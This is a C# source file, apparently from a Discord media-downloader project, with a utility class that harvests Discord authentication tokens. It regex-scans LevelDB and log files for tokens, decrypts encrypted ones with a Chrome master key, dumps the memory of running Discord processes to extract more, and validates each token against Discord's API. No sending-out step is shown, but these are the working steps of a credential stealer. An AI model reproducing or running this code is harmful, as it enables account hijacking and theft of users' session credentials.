using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

using Discord_Media_DL.Misc;
using Discord_Media_DL.Token.Apps;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Discord_Media_DL.Token
{
    static class TokensUtil
    {
        public static string[] GetTokensFromText(string text, List<string> previousResults = null, byte[] masterKeyBytes = null)
        {
            if (string.IsNullOrWhiteSpace(text) == true)
                return new string[0];

            try
            {
                List<string> result = previousResults ?? new List<string>();

                #region Old Method 
                // Get default (old) tokens.
                try
                {
                    foreach (Match m in new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled).Matches(text))
                    {
                        try
                        {
                            if (m.Success == false)
                                continue;

                            if (string.IsNullOrEmpty(m.Value))
                                continue;

                            if (result.Contains(m.Value) == true)
                                continue;

                            result.Add(m.Value);
                        }
                        catch { }
                    }
                }
                catch { }

                // Get old "mfa"-tokens.
                try
                {
                    foreach (Match m in new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled).Matches(text))
                    {
                        try
                        {
                            if (m.Success == false)
                                continue;

                            if (string.IsNullOrEmpty(m.Value))
                                continue;

                            if (result.Contains(m.Value) == true)
                                continue;

                            result.Add(m.Value);
                        }
                        catch { }
                    }
                }
                catch { }
                #endregion

                #region New Method
                // Get all encrypted tokens (new, requires valid master-key)
                if (masterKeyBytes != null && masterKeyBytes.Length > 0)
                {
                    try
                    {
                        foreach (Match m in new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled).Matches(text))
                        {
                            try
                            {
                                if (m.Success == false)
                                    continue;

                                var encrypted_token = m.Groups[2].Value;

                                if (string.IsNullOrEmpty(encrypted_token) == true)
                                    continue;

                                var decrypted_token = ChromeSecurity.DecryptValue(Convert.FromBase64String(encrypted_token), masterKeyBytes);

                                if (decrypted_token == null || result.Contains(decrypted_token) == true)
                                    continue;

                                result.Add(decrypted_token);
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
                #endregion

                return result.ToArray();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }

            return new string[0];
        }

        public static string[] GetTokensFromPath(string path, byte[] masterKeyBytes)
        {
            if (string.IsNullOrWhiteSpace(path) || Directory.Exists(path) == false)
                return new string[0];

            List<string> result = new();

            Help.Directories.ExploreFilesRecursively(path, delegate (string file)
            {
                if (file.EndsWith(".log") == false && file.EndsWith(".ldb") == false)
                    return;

                try
                {
                    result.AddRange(GetTokensFromText(File.ReadAllText(file), null, masterKeyBytes));
                }
                catch
                {
                    // if its used by another process
                }
            });

            return result.ToArray();
        }

        public static DiscordToken[] GetTokensFromProcessDumps()
        {
            List<DiscordToken> result = new();

            {
                Dictionary<IApp, string> allDumps = new()
                {
                    { new Apps.Discord(), Help.DumpProcessAsString("discord") },
                    { new DiscordCanary(), Help.DumpProcessAsString("discordcanary") },
                    { new DiscordPTB(), Help.DumpProcessAsString("discordptb") }
                };

                foreach (KeyValuePair<IApp, string> kvp in allDumps)
                {
                    foreach (var token in GetTokensFromText(kvp.Value))
                    {
                        if (result.Any((tk) => tk.Token == token))
                            continue;

                        result.Add(new DiscordToken(kvp.Key, token));
                    }
                }
            }

            return result.ToArray();
        }

        public static async Task<bool> IsValidToken(string Token)
        {
            try
            {
                WebClient client = new();
                client.Headers.Add("authorization", Token);

                var json = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me");

                client.Dispose();

                JObject j = (JObject)JsonConvert.DeserializeObject(json);

                // usually it would be enough to simply check if the request goes through
                // just making sure here :)
                return j.ContainsKey("id");
            }
            catch { }

            return false;

        }
    }
}
